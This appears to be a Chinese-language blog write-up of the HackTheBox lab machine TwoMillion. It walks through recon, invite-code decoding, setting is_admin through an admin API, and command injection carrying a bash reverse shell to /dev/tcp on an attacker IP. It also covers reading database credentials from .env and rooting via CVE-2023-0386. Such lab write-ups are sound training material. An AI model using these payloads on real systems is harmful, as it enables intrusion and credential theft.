{"pageProps":{"postData":{"id":"HackTheBoxMachine - TwoMillion","contentHtml":"<h1>Machine - TwoMillion</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/TwoMillion\">https://app.hackthebox.com/machines/TwoMillion</a> | <code>Linux</code> | <code>Eas</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<pre><code class=\"hljs language-bash\">➜  TwoMillion nmap -sT -min-rate 5000 10.10.11.221  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 20:22 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.221\nHost is up (0.072s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 0.94 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  TwoMillion nmap -sT -A -p 22,80 10.10.11.221   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 20:23 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.221\nHost is up (0.085s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp open  http    nginx\n|_http-title: Did not follow redirect to http://2million.htb/\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   117.43 ms 10.10.16.1\n2   71.72 ms  10.10.11.221\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 12.44 seconds\n➜  TwoMillion <span class=\"hljs-built_in\">ls</span>                                  \n</code></pre>\n<p>访问 <code>HTTP</code> 服务，采集指纹，是介绍 <code>HackTheBox</code> 网站</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image1.png\" alt=\"image.png\"></p>\n<p>有一个登录页</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image2.png\" alt=\"image.png\"></p>\n<p>注册需要拿到邀请码</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image3.png\" alt=\"image.png\"></p>\n<p>通过目录扫描能扫描到另外一个注册页面，依旧是需要<code>Invite Code</code></p>\n<pre><code class=\"hljs language-bash\">➜  TwoMillion dirsearch -u http://2million.htb -e txt,zip -x 403,404,503 \n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 9979\n\nOutput File: /root/Desktop/HackTheBox/TwoMillion/reports/http_2million.htb/_25-06-20_20-53-44.txt\n\nTarget: http://2million.htb/\n\n[20:53:44] Starting: \n[20:53:53] 200 -    2KB - /404\n[20:54:04] 401 -    0B  - /api\n[20:54:04] 401 -    0B  - /api/v1\n[20:54:05] 301 -  162B  - /assets  ->  http://2million.htb/assets/\n[20:54:12] 301 -  162B  - /css  ->  http://2million.htb/css/\n[20:54:18] 301 -  162B  - /fonts  ->  http://2million.htb/fonts/\n[20:54:20] 302 -    0B  - /home  ->  /\n[20:54:21] 301 -  162B  - /images  ->  http://2million.htb/images/\n[20:54:23] 301 -  162B  - /js  ->  http://2million.htb/js/\n[20:54:25] 200 -    4KB - /login\n[20:54:26] 302 -    0B  - /logout  ->  /\n[20:54:38] 200 -    4KB - /register\n[20:54:52] 301 -  162B  - /views  ->  http://2million.htb/views/\n\nTask Completed\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image4.png\" alt=\"image.png\"></p>\n<h2>GetInviteCode</h2>\n<p>我们仔细观察<code>invite</code>页面，会加载一个JS文件<code>inviteapi.min.js</code> ，是一个<code>Packer</code>一种<code>JavaScript</code>代码混淆器</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">eval</span>(\n  (<span class=\"hljs-keyword\">function</span> (p, a, c, k, e, d) {\n    e = <span class=\"hljs-keyword\">function</span> (c) {\n      <span class=\"hljs-built_in\">return</span> c.toString(36);\n    };\n    <span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-string\">''</span>.replace(/^/, String)) {\n      <span class=\"hljs-keyword\">while</span> (c--) {\n        d[c.toString(a)] = k[c] || c.toString(a);\n      }\n      k = [\n        <span class=\"hljs-keyword\">function</span> (e) {\n          <span class=\"hljs-built_in\">return</span> d[e];\n        },\n      ];\n      e = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        <span class=\"hljs-built_in\">return</span> <span class=\"hljs-string\">'\\\\w+'</span>;\n      };\n      c = 1;\n    }\n    <span class=\"hljs-keyword\">while</span> (c--) {\n      <span class=\"hljs-keyword\">if</span> (k[c]) {\n        p = p.replace(new RegExp(<span class=\"hljs-string\">'\\\\b'</span> + e(c) + <span class=\"hljs-string\">'\\\\b'</span>, <span class=\"hljs-string\">'g'</span>), k[c]);\n      }\n    }\n    <span class=\"hljs-built_in\">return</span> p;\n  })(\n    <span class=\"hljs-string\">'1 i(4){h 8={\"4\":4};$.9({a:\"7\",5:\"6\",g:8,b:\\'</span>/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 <span class=\"hljs-function\"><span class=\"hljs-title\">j</span></span>(){$.9({a:<span class=\"hljs-string\">\"7\"</span>,5:<span class=\"hljs-string\">\"6\"</span>,b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}<span class=\"hljs-string\">',\n    24,\n    24,\n    '</span>response|<span class=\"hljs-keyword\">function</span>|<span class=\"hljs-built_in\">log</span>|console|code|dataType|json|POST|formData|ajax|<span class=\"hljs-built_in\">type</span>|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify<span class=\"hljs-string\">'.split(\n      '</span>|<span class=\"hljs-string\">',\n    ),\n    0,\n    {},\n  ),\n);\n\n</span></code></pre>\n<p>我们使用<code>AI</code>将其还原得到</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">function</span> verifyInviteCode(code) {\n  var formData = { <span class=\"hljs-string\">\"code\"</span>: code };\n  $.ajax({\n    <span class=\"hljs-built_in\">type</span>: <span class=\"hljs-string\">\"POST\"</span>,\n    dataType: <span class=\"hljs-string\">\"json\"</span>,\n    data: formData,\n    url: <span class=\"hljs-string\">'/api/v1/invite/verify'</span>,\n    success: <span class=\"hljs-keyword\">function</span>(response) {\n      console.log(response);\n    },\n    error: <span class=\"hljs-keyword\">function</span>(response) {\n      console.log(response);\n    }\n  });\n}\n\n<span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">makeInviteCode</span></span>() {\n  $.ajax({\n    <span class=\"hljs-built_in\">type</span>: <span class=\"hljs-string\">\"POST\"</span>,\n    dataType: <span class=\"hljs-string\">\"json\"</span>,\n    url: <span class=\"hljs-string\">'/api/v1/invite/how/to/generate'</span>,\n    success: <span class=\"hljs-keyword\">function</span>(response) {\n      console.log(response);\n    },\n    error: <span class=\"hljs-keyword\">function</span>(response) {\n      console.log(response);\n    }\n  });\n}\n</code></pre>\n<p>其中的<code>/api/v1/invite/how/to/generate</code>很令人感兴趣</p>\n<pre><code class=\"hljs language-bash\">➜  TwoMillion curl http://2million.htb/api/v1/invite/how/to/generate -X POST\n{<span class=\"hljs-string\">\"0\"</span>:200,<span class=\"hljs-string\">\"success\"</span>:1,<span class=\"hljs-string\">\"data\"</span>:{<span class=\"hljs-string\">\"data\"</span>:<span class=\"hljs-string\">\"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr\"</span>,<span class=\"hljs-string\">\"enctype\"</span>:<span class=\"hljs-string\">\"ROT13\"</span>},<span class=\"hljs-string\">\"hint\"</span>:<span class=\"hljs-string\">\"Data is encrypted ... We should probbably check the encryption type in order to decrypt it...\"</span>}#\n</code></pre>\n<blockquote>\n<p>Data is encrypted ... We should probbably check the encryption type in order to decrypt it...</p>\n</blockquote>\n<p>从<code>dada</code>能看到，加密类型是<code>ROT13</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-string\">\"data\"</span>:{\n\t<span class=\"hljs-string\">\"data\"</span>:<span class=\"hljs-string\">\"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr\"</span>,\n\t<span class=\"hljs-string\">\"enctype\"</span>:<span class=\"hljs-string\">\"ROT13\"</span>\n}\n</code></pre>\n<p>通过<code>CyberChef</code>即可解密</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image5.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">In order to generate the invite code, make a POST request to \\/api\\/v1\\/invite\\/generate\n</code></pre>\n<p>让我们向<code>/api/v1/invite/generate</code> 发起<code>POST</code>请求</p>\n<pre><code class=\"hljs language-bash\">➜  TwoMillion curl http://2million.htb/api/v1/invite/generate  -X POST     \n{<span class=\"hljs-string\">\"0\"</span>:200,<span class=\"hljs-string\">\"success\"</span>:1,<span class=\"hljs-string\">\"data\"</span>:{<span class=\"hljs-string\">\"code\"</span>:<span class=\"hljs-string\">\"NjlKS04tMkVHSTQtM1NIN0YtUjNLRFk=\"</span>,<span class=\"hljs-string\">\"format\"</span>:<span class=\"hljs-string\">\"encoded\"</span>}}#  \n</code></pre>\n<p>可以看到还是加密的，但是这次的加密就是简单的<code>base64</code>编码</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image6.png\" alt=\"image.png\"></p>\n<p>得到邀请码 <code>69JKN-2EGI4-3SH7F-R3KDY</code></p>\n<p>我们通过邀请码注册用户 <code>sunset</code></p>\n<h2>后台利用</h2>\n<p>我们从<code>Rules</code>中能知道是可以攻击其他成员的</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image7.png\" alt=\"image.png\"></p>\n<p>并且在 <code>http://2million.htb/home/access#</code> 中能生成<code>opvn</code>文件（经过实验是无法进行连接的），端点是**<code>/**api/v1/user/vpn/generate</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image8.png\" alt=\"image.png\"></p>\n<p>我们可以注意到端点是**<code>/**api/v1/user</code> 那么可能会有**<code>/**api/v1/admin</code></p>\n<p>这里我使用<code>feroxbuster</code> 测试了很久，但是还是没有<code>fuzz</code>出来</p>\n<p>但是这里其实只需要访问 <code>/api/v1</code>就可以得到接口路径信息…</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image9.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">{\n  <span class=\"hljs-string\">\"v1\"</span>: {\n    <span class=\"hljs-string\">\"user\"</span>: {\n      <span class=\"hljs-string\">\"GET\"</span>: {\n        <span class=\"hljs-string\">\"/api/v1\"</span>: <span class=\"hljs-string\">\"Route List\"</span>,\n        <span class=\"hljs-string\">\"/api/v1/invite/how/to/generate\"</span>: <span class=\"hljs-string\">\"Instructions on invite code generation\"</span>,\n        <span class=\"hljs-string\">\"/api/v1/invite/generate\"</span>: <span class=\"hljs-string\">\"Generate invite code\"</span>,\n        <span class=\"hljs-string\">\"/api/v1/invite/verify\"</span>: <span class=\"hljs-string\">\"Verify invite code\"</span>,\n        <span class=\"hljs-string\">\"/api/v1/user/auth\"</span>: <span class=\"hljs-string\">\"Check if user is authenticated\"</span>,\n        <span class=\"hljs-string\">\"/api/v1/user/vpn/generate\"</span>: <span class=\"hljs-string\">\"Generate a new VPN configuration\"</span>,\n        <span class=\"hljs-string\">\"/api/v1/user/vpn/regenerate\"</span>: <span class=\"hljs-string\">\"Regenerate VPN configuration\"</span>,\n        <span class=\"hljs-string\">\"/api/v1/user/vpn/download\"</span>: <span class=\"hljs-string\">\"Download OVPN file\"</span>\n      },\n      <span class=\"hljs-string\">\"POST\"</span>: {\n        <span class=\"hljs-string\">\"/api/v1/user/register\"</span>: <span class=\"hljs-string\">\"Register a new user\"</span>,\n        <span class=\"hljs-string\">\"/api/v1/user/login\"</span>: <span class=\"hljs-string\">\"Login with existing user\"</span>\n      }\n    },\n    <span class=\"hljs-string\">\"admin\"</span>: {\n      <span class=\"hljs-string\">\"GET\"</span>: {\n        <span class=\"hljs-string\">\"/api/v1/admin/auth\"</span>: <span class=\"hljs-string\">\"Check if user is admin\"</span>\n      },\n      <span class=\"hljs-string\">\"POST\"</span>: {\n        <span class=\"hljs-string\">\"/api/v1/admin/vpn/generate\"</span>: <span class=\"hljs-string\">\"Generate VPN for specific user\"</span>\n      },\n      <span class=\"hljs-string\">\"PUT\"</span>: {\n        <span class=\"hljs-string\">\"/api/v1/admin/settings/update\"</span>: <span class=\"hljs-string\">\"Update user settings\"</span>\n      }\n    }\n  }\n}\n</code></pre>\n<h3>接口测试</h3>\n<p>三个管理员接口中，我们对<code>/api/v1/admin/settings/update</code> 最感兴趣</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-string\">\"admin\"</span>: {\n      <span class=\"hljs-string\">\"GET\"</span>: {\n        <span class=\"hljs-string\">\"/api/v1/admin/auth\"</span>: <span class=\"hljs-string\">\"Check if user is admin\"</span>\n      },\n      <span class=\"hljs-string\">\"POST\"</span>: {\n        <span class=\"hljs-string\">\"/api/v1/admin/vpn/generate\"</span>: <span class=\"hljs-string\">\"Generate VPN for specific user\"</span>\n      },\n      <span class=\"hljs-string\">\"PUT\"</span>: {\n        <span class=\"hljs-string\">\"/api/v1/admin/settings/update\"</span>: <span class=\"hljs-string\">\"Update user settings\"</span>\n      }\n    }\n</code></pre>\n<p>因为它可能可以将普通用户更改为高权限用户</p>\n<p>调试接口，我们修改 <code>Content-Type: application/json</code> 时提示缺少参数 <code>email</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image10.png\" alt=\"image.png\"></p>\n<p>添加 <code>email</code> 后缺少 <code>is_admin</code> ，继续跟着补全参数</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image11.png\" alt=\"image.png\"></p>\n<p>设置 <code>is_admin</code> 为 <code>1</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image12.png\" alt=\"image.png\"></p>\n<p>测试是否修改成功，我们回到管理员接口中的<code>/api/v1/admin/auth</code> ，回显<code>True</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image13.png\" alt=\"image.png\"></p>\n<p>再获取管理员账户的<code>VPN</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image14.png\" alt=\"image.png\"></p>\n<p>通过命令也可以拿到</p>\n<pre><code class=\"hljs language-bash\">➜  TwoMillion curl http://2million.htb/api/v1/admin/vpn/generate -X POST -H <span class=\"hljs-string\">'Cookie: PHPSESSID=ldkjilnio1ali642q30g4cs1p4'</span> -H <span class=\"hljs-string\">'Content-Type: application/json'</span> -d <span class=\"hljs-string\">'{\"username\":\"admin\"}'</span> -o admin.opvn\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 10844    0 10824  100    20  19492     36 --:--:-- --:--:-- --:--:-- 19538\n</code></pre>\n<p>但是经过测试，管理员的<code>opvn</code>文件也是无法使用的</p>\n<p>测试后发现存在命令注入漏洞</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image15.png\" alt=\"image.png\"></p>\n<p>我们通过来反弹<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">POST /api/v1/admin/vpn/generate HTTP/1.1\nHost: 2million.htb\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0\nCookie: PHPSESSID=ldkjilnio1ali642q30g4cs1p4\nUpgrade-Insecure-Requests: 1\nSec-GPC: 1\nPriority: u=0, i\nDNT: 1\nReferer: http://2million.htb/home/access\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\n\n{\n    <span class=\"hljs-string\">\"username\"</span>:<span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(whoami;/bin/bash -c 'bash -i >&#x26; /dev/tcp/10.10.16.58/1234 0>&#x26;1')</span>\"</span>\n}\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image16.png\" alt=\"image.png\"></p>\n<h2>权限提升</h2>\n<h3>Recon In www-data</h3>\n<p>插件监听端口，在内网中发布了<code>mysql</code>和<code>Memcached</code></p>\n<pre><code class=\"hljs language-bash\">www-data@2million:~/html$ ss -tulpn\nNetid   State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process\nudp     UNCONN   0        0          127.0.0.53%lo:53             0.0.0.0:*\nudp     UNCONN   0        0                0.0.0.0:68             0.0.0.0:*\ntcp     LISTEN   0        80             127.0.0.1:3306           0.0.0.0:*\ntcp     LISTEN   0        1024           127.0.0.1:11211          0.0.0.0:*\ntcp     LISTEN   0        511              0.0.0.0:80             0.0.0.0:*      <span class=\"hljs-built_in\">users</span>:((\"nginx\",pid=<span class=\"hljs-number\">1198</span>,fd=<span class=\"hljs-number\">6</span>))\ntcp     LISTEN   0        4096       127.0.0.53%lo:53             0.0.0.0:*\ntcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*\ntcp     LISTEN   0        511                 [::]:80                [::]:*      <span class=\"hljs-built_in\">users</span>:((\"nginx\",pid=<span class=\"hljs-number\">1198</span>,fd=<span class=\"hljs-number\">7</span>))\ntcp     LISTEN   0        128                 [::]:22                [::]:*\n</code></pre>\n<p>获取 <code>Memcached</code> 中的数据，命令网上查即可</p>\n<pre><code class=\"hljs language-bash\">stats items               \nSTAT items:1:number 1   \nSTAT items:1:number_hot 0       \n....\nSTAT items:4:evicted_unfetched 0\nSTAT items:4:evicted_active 0\n</code></pre>\n<pre><code class=\"hljs language-bash\">stats cachedump 1 100\nITEM foo [3 b; 0 s]\nEND\nstats cachedump 4 100\nITEM memc.sess.key.ldkjilnio1ali642q30g4cs1p4 [56 b; 1750433152 s]\nEND\n</code></pre>\n<pre><code class=\"hljs language-bash\">get foo\nVALUE foo 0 3\nbar\nEND\n\nget memc.sess.key.ldkjilnio1ali642q30g4cs1p4\nVALUE memc.sess.key.ldkjilnio1ali642q30g4cs1p4 0 56\nloggedin|b:1;<span class=\"hljs-built_in\">id</span>|i:13;username|s:6:<span class=\"hljs-string\">\"sunset\"</span>;is_admin|i:1;\nEND\n</code></pre>\n<p>但是得到信息貌似并没有什么用</p>\n<p>在当前目录下的<code>.env</code> 中能找到 <code>admin</code> 用户的凭据</p>\n<pre><code class=\"hljs language-bash\">www-data@2million:~/html$ <span class=\"hljs-built_in\">cat</span> .<span class=\"hljs-built_in\">env</span> \nDB_HOST=127.0.0.1\nDB_DATABASE=htb_prod\nDB_USERNAME=admin\nDB_PASSWORD=SuperDuperPass123\n</code></pre>\n<p>成功登录进去</p>\n<pre><code class=\"hljs language-bash\">The list of available updates is more than a week old.\nTo check <span class=\"hljs-keyword\">for</span> new updates run: <span class=\"hljs-built_in\">sudo</span> apt update\n\nYou have mail.\nLast login: Tue Jun  6 12:43:11 2023 from 10.10.14.6\nTo run a <span class=\"hljs-built_in\">command</span> as administrator (user <span class=\"hljs-string\">\"root\"</span>), use <span class=\"hljs-string\">\"sudo &#x3C;command>\"</span>.\nSee <span class=\"hljs-string\">\"man sudo_root\"</span> <span class=\"hljs-keyword\">for</span> details.\n\nadmin@2million:~$ \n</code></pre>\n<p>读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">admin@2million:~$ <span class=\"hljs-built_in\">cat</span> user.txt \ne3c66af3c3a55bxxxxxxx\n</code></pre>\n<h3>Recon In admin</h3>\n<p>我们从<code>banner</code>信息中能看到<code>admin</code>用户有一封邮件</p>\n<pre><code class=\"hljs language-bash\">The list of available updates is more than a week old.\nTo check <span class=\"hljs-keyword\">for</span> new updates run: <span class=\"hljs-built_in\">sudo</span> apt update\n\n***You have mail.***\nLast login: Tue Jun  6 12:43:11 2023 from 10.10.14.6\nTo run a <span class=\"hljs-built_in\">command</span> as administrator (user <span class=\"hljs-string\">\"root\"</span>), use <span class=\"hljs-string\">\"sudo &#x3C;command>\"</span>.\nSee <span class=\"hljs-string\">\"man sudo_root\"</span> <span class=\"hljs-keyword\">for</span> details.\n\nadmin@2million:~$ \n</code></pre>\n<pre><code class=\"hljs language-bash\">admin@2million:/var/mail$ <span class=\"hljs-built_in\">cat</span> admin \nFrom: ch4p &#x3C;ch4p@2million.htb>\nTo: admin &#x3C;admin@2million.htb>\nCc: g0blin &#x3C;g0blin@2million.htb>\nSubject: Urgent: Patch System OS\nDate: Tue, 1 June 2023 10:45:22 -0700\nMessage-ID: &#x3C;9876543210@2million.htb>\nX-Mailer: ThunderMail Pro 5.2\n\nHey admin,\n\nI<span class=\"hljs-string\">'m know you'</span>re working as fast as you can to <span class=\"hljs-keyword\">do</span> the DB migration. While we<span class=\"hljs-string\">'re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can'</span>t get popped by that.\n\nHTB Godfather\n</code></pre>\n<blockquote>\n<p>嗨，管理员，\n我知道你正在尽快完成数据库迁移。趁着我们部分服务器宕机，能不能也升级一下我们虚拟主机的操作系统？今年已经出现了几个严重的 Linux 内核 CVE 漏洞。OverlayFS/FUSE 的那个漏洞看起来很糟糕。我们不能被它给坑了。</p>\n</blockquote>\n<h3><strong>CVE-2023-0386</strong></h3>\n<p>直接明牌了</p>\n<p>利用链接：<a href=\"https://github.com/xkaneiki/CVE-2023-0386\">https://github.com/xkaneiki/CVE-2023-0386</a></p>\n<p>跟着<code>Readme</code>敲就行</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image17.png\" alt=\"image.png\"></p>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@2million:/root# <span class=\"hljs-built_in\">cat</span> root.txt \nc7bea054524b8584598731e5cb0441bb\n</code></pre>\n<h2>总结 &#x26; 小彩蛋</h2>\n<p>不难，但是步骤多，在前期需要进行很多枚举</p>\n<p><code>root</code>目录下<code>thank_you.json</code> 是一串加密后的数据</p>\n<pre><code class=\"hljs language-bash\">root@2million:/root# <span class=\"hljs-built_in\">cat</span> thank_you.json \n{<span class=\"hljs-string\">\"encoding\"</span>: <span class=\"hljs-string\">\"url\"</span>, <span class=\"hljs-string\">\"data\"</span>: <span class=\"hljs-string\">\"%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D\"</span>}\n</code></pre>\n<p>可以通过这个步骤来揭秘</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20TwoMillion/image18.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">Dear HackTheBox Community,\n\nWe are thrilled to announce a momentous milestone <span class=\"hljs-keyword\">in</span> our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable <span class=\"hljs-built_in\">users</span>! This incredible feat would not have been possible without each and every one of you.\n\nFrom the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment <span class=\"hljs-built_in\">where</span> innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.\n\nTo each and every member of the HackTheBox community, thank you <span class=\"hljs-keyword\">for</span> being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.\n\nHere<span class=\"hljs-string\">'s to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.\n\nWith deepest gratitude,\n\nThe HackTheBox Team\n</span></code></pre>","title":"HackTheBox - Machine - TwoMillion","date":"2025-06-21","updated":"2025-06-21","tags":["HackTheBox","Linux","FUZZ","CVE-2023-0386"],"categories":"靶机","comments":true,"description":"Machine - TwoMillion\n\n https://app.hackthebox.com/machines/TwoMillion | `Linux` | `Eas`\n \n\n\n\nRecon\n\n\n\n\n\n访问 `HTTP` 服务，采集指纹，是介绍 `HackTheBox` 网站\n\n\n\n有一个登录页\n\n\n\n注册需要拿到邀请码\n\n\n\n通过目录扫描能扫描到另外一个注册页面，依旧是需要`Invite ..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Outbound","title":"HackTheBox - Season8 - Outbound","date":"2025-07-13","isEncrypted":true,"year":"2025","month":"07","day":"13"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Season8 - Voleur","date":"2025-07-07","isEncrypted":true,"year":"2025","month":"07","day":"07"},{"id":"TryHackMeCreative","title":"TryHackMe - Creative","date":"2025-07-05","isEncrypted":false,"year":"2025","month":"07","day":"05"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":true,"year":"2025","month":"06","day":"30"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"},{"id":"HackTheBoxMachine - TwoMillion","title":"HackTheBox - 